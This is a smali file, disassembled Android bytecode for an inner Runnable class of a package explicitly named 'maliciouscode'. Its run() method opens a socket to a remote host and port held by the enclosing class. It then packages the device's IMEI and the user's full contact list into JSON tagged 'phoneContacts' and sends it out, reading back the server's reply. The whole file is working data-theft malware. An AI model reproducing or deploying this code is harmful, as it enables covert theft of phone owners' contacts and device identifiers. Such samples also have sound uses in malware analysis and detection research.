.class final Lcom/lu/maliciouscode/PhoneInfoTool$2;
.super Ljava/lang/Object;
.source "PhoneInfoTool.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/lu/maliciouscode/PhoneInfoTool;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x8
    name = null
.end annotation


# direct methods
.method constructor <init>()V
    .locals 0

    .prologue
    .line 370
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 14

    .prologue
    .line 372
    const/4 v9, 0x0

    .line 374
    .local v9, "socket":Ljava/net/Socket;
    :try_start_0
    new-instance v10, Ljava/net/Socket;

    invoke-static {}, Lcom/lu/maliciouscode/PhoneInfoTool;->access$000()Ljava/lang/String;

    move-result-object v12

    invoke-static {}, Lcom/lu/maliciouscode/PhoneInfoTool;->access$100()I

    move-result v13

    invoke-direct {v10, v12, v13}, Ljava/net/Socket;-><init>(Ljava/lang/String;I)V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_1

    .line 375
    .end local v9    # "socket":Ljava/net/Socket;
    .local v10, "socket":Ljava/net/Socket;
    :try_start_1
    new-instance v6, Lorg/json/JSONObject;

    invoke-direct {v6}, Lorg/json/JSONObject;-><init>()V

    .line 376
    .local v6, "jsonobj":Lorg/json/JSONObject;
    const-string v12, "ID"

    const-string v13, "chicken"

    invoke-virtual {v6, v12, v13}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 377
    const-string v12, "datatype"

    const-string v13, "phoneContacts"

    invoke-virtual {v6, v12, v13}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 378
    const-string v12, "IMEI"

    invoke-static {}, Lcom/lu/maliciouscode/PhoneInfoTool;->access$200()Lcom/lu/maliciouscode/PhoneInfo;

    move-result-object v13

    invoke-virtual {v13}, Lcom/lu/maliciouscode/PhoneInfo;->getPhoneIMEI()Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v6, v12, v13}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 379
    const-string v12, "usercontact"

    invoke-static {}, Lcom/lu/maliciouscode/PhoneInfoTool;->access$200()Lcom/lu/maliciouscode/PhoneInfo;

    move-result-object v13

    invoke-virtual {v13}, Lcom/lu/maliciouscode/PhoneInfo;->getPhoneContacter()Ljava/util/List;

    move-result-object v13

    invoke-virtual {v6, v12, v13}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 380
    invoke-virtual {v6}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v1

    .line 381
    .local v1, "data":Ljava/lang/String;
    invoke-virtual {v10}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v7

    .line 382
    .local v7, "outputStream":Ljava/io/OutputStream;
    new-instance v8, Ljava/io/PrintWriter;

    invoke-direct {v8, v7}, Ljava/io/PrintWriter;-><init>(Ljava/io/OutputStream;)V

    .line 383
    .local v8, "printWriter":Ljava/io/PrintWriter;
    invoke-virtual {v8, v1}, Ljava/io/PrintWriter;->print(Ljava/lang/String;)V

    .line 384
    invoke-virtual {v8}, Ljava/io/PrintWriter;->flush()V

    .line 385
    invoke-virtual {v10}, Ljava/net/Socket;->shutdownOutput()V

    .line 386
    invoke-virtual {v10}, Ljava/net/Socket;->getInputStream()Ljava/io/InputStream;

    move-result-object v4

    .line 387
    .local v4, "inputStream":Ljava/io/InputStream;
    new-instance v5, Ljava/io/InputStreamReader;

    invoke-direct {v5, v4}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    .line 388
    .local v5, "inputStreamReader":Ljava/io/InputStreamReader;
    new-instance v0, Ljava/io/BufferedReader;

    invoke-direct {v0, v5}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 389
    .local v0, "bufferedReader":Ljava/io/BufferedReader;
    const-string v3, ""

    .line 390
    .local v3, "info":Ljava/lang/String;
    const/4 v11, 0x0

    .line 391
    .local v11, "temp":Ljava/lang/String;
    :goto_0
    invoke-virtual {v0}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v11

    if-eqz v11, :cond_0

    .line 392
    new-instance v12, Ljava/lang/StringBuilder;

    invoke-direct {v12}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v12, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v12

    invoke-virtual {v12, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v12

    invoke-virtual {v12}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    goto :goto_0

    .line 394
    :cond_0
    invoke-virtual {v0}, Ljava/io/BufferedReader;->close()V

    .line 395
    invoke-virtual {v4}, Ljava/io/InputStream;->close()V

    .line 396
    invoke-virtual {v10}, Ljava/net/Socket;->close()V
    :try_end_1
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_3
    .catch Lorg/json/JSONException; {:try_start_1 .. :try_end_1} :catch_2

    move-object v9, v10

    .line 402
    .end local v0    # "bufferedReader":Ljava/io/BufferedReader;
    .end local v1    # "data":Ljava/lang/String;
    .end local v3    # "info":Ljava/lang/String;
    .end local v4    # "inputStream":Ljava/io/InputStream;
    .end local v5    # "inputStreamReader":Ljava/io/InputStreamReader;
    .end local v6    # "jsonobj":Lorg/json/JSONObject;
    .end local v7    # "outputStream":Ljava/io/OutputStream;
    .end local v8    # "printWriter":Ljava/io/PrintWriter;
    .end local v10    # "socket":Ljava/net/Socket;
    .end local v11    # "temp":Ljava/lang/String;
    .restart local v9    # "socket":Ljava/net/Socket;
    :goto_1
    return-void

    .line 397
    :catch_0
    move-exception v2

    .line 398
    .local v2, "e":Ljava/io/IOException;
    :goto_2
    invoke-virtual {v2}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_1

    .line 399
    .end local v2    # "e":Ljava/io/IOException;
    :catch_1
    move-exception v2

    .line 400
    .local v2, "e":Lorg/json/JSONException;
    :goto_3
    invoke-virtual {v2}, Lorg/json/JSONException;->printStackTrace()V

    goto :goto_1

    .line 399
    .end local v2    # "e":Lorg/json/JSONException;
    .end local v9    # "socket":Ljava/net/Socket;
    .restart local v10    # "socket":Ljava/net/Socket;
    :catch_2
    move-exception v2

    move-object v9, v10

    .end local v10    # "socket":Ljava/net/Socket;
    .restart local v9    # "socket":Ljava/net/Socket;
    goto :goto_3

    .line 397
    .end local v9    # "socket":Ljava/net/Socket;
    .restart local v10    # "socket":Ljava/net/Socket;
    :catch_3
    move-exception v2

    move-object v9, v10

    .end local v10    # "socket":Ljava/net/Socket;
    .restart local v9    # "socket":Ljava/net/Socket;
    goto :goto_2
.end method
